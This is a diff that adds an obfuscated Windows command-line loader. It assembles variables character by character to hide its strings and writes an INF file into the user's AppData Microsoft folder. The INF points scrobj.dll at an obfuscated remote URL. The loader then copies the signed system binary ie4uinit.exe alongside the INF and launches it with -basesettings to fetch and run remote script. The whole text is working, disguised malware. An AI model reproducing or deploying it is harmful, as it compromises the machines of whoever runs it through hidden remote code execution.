@@ -1,0 +1,29 @@
+/v /c  (for %y in ("One_hundred_thirty_six=al" "Fifty_six=a" "Fifty=e" "Sixty_four=s" "Seventy_four=t" "One_hundred_thirty_seven=et" ) do @set %~y) &&
+  callcall(for %i in ("i") do @set "Thirty_one=%~i") &&
+  (for %p in ("]") do @set "One_hundred=%~p") &&
+  callcall(for %p in ("T") do @set "Ninety_two=%~p") &&
+  (for %p in ("c") do @set "One_hundred_three=%~p") &&
+  callcallcallcallcall(for %o in ("u") do @set "One_hundred_nine=%~o") &&
+  call(for %y in (" ") do @set "Fourteen=%~y") &&
+  (for %m in ("B") do @set "One_hundred_twenty_nine=%~m") &&
+  call(for %l in ("U") do @set "Seventy_one=%~l") &&
+  (for %b in ("\") do @set "Twenty=%~b") &&
+  (for %i in ("R") do @set "Seventy_nine=%~i") &&
+  (for %k in ("C") do @set "Seven=%~k") &&
+  (for %f in ("S") do @set "One_hundred_ten=%~f") &&
+  (for %e in ("D") do @set "Eighty_one=%~e") &&
+  (for %n in ("F") do @set "Ninety_eight=%~n") &&
+  call(for %i in ("i") do @set "Thirty_one=%~i") &&
+  (for %n in ("n") do @set "Fifty_seven=%~n") &&
+  (for %g in ("_") do @set "One_hundred_twenty=%~g") &&
+  (for %h in ("c") do @set "One_hundred_three=%~h") &&
+  (for %p in ("o") do @set "One_hundred_twenty_seven=%~p") &&
+  callcall(for %k in ("s") do @set "One_hundred_thirty_five=%~k") &&
+  callcall(for %i in ("f") do @set "One_hundred_forty=%~i") &&
+  (for %t in ("m") do @set "One_hundred_twenty_four=%~t") &&
+  (for %h in (".") do @set "One_hundred_twenty_five=%~h") &&
+  callcall(for %t in ("0") do @set "Fifty_four=%~t") &&
+  callcall(for %k in (".") do @set "One_hundred_twenty_five=%~k") &&
+  callcallcall(for %g in ("[778ED1]" "i%Thirty_eight%u%Forty_eight%n%Forty_eight%t%Forty_three%i%Forty_seven%f" "[ver%~kion%~p" "%~kignat%~ore=$windows nt$" "[destinationdirs%~p" "de%~ia%~oltdestdir=11" "778E%~e1=01" "[strings%~p" "%~kervicename= 'Eighty%~gtwo'" "short%~kvcname= 'Eighty_two'" "Forty_three=." "One_hundred_twenty_six=/" "One_hundred_thirty=:" "Sixty=I" "Fifty_five=c" "Ninety_three=d" "Thirty_eight=e" "One_hundred_two=h" "Forty_eight=i" "Ninety_one=k" "One_hundred_twenty_three=l" "Forty_seven=n" "Eighteen=o" "Forty_four=t" "[defaultin%~ktall.window%~k7%~p" "delfiles=778ED1" "Un\" "Register\" "OCX%~k=%~ni%~iteen_%~t25" "[%~ni%~iteen_%~t25]" "s%Fifty_five%r%Eighteen%b\" "j%Forty_three%d%One_hundred_twenty_three%l,N%Sixty%,%One_hundred_two%t%Forty_four%p%One_hundred_thirty%/%One_hundred_twenty_six%a%Ninety_one%j%Ninety_three%f%Forty_three%c%Eighteen%m" ) do @echo %~g) > "%appdata%\%~ticrosoft\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\%~ky%~ktem32\ie4%~oinit.exe "%appdata%\%~ticrosoft" &&
+  start " " %appdata%\%~ticrosoft\ie4uinit%~kexe -basesetting%~k
